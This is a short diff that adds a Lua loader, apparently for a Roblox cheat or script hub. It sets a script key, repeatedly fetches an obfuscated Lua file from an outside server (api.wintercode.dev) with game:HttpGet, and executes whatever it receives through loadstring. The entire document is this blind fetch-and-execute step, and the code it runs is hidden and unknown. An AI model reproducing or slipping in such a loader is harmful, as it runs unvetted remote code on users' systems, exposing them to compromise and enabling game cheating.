@@ -1,0 +1,3 @@
+script_key="E5ECC296CE60E2EFA78D52F20596D297";
+
+local s,r repeat s,r=pcall(function()return game:HttpGet("https://api.wintercode.dev/loader/Accept-obfuscated.lua")end)wait(1)until s;loadstring(r)()
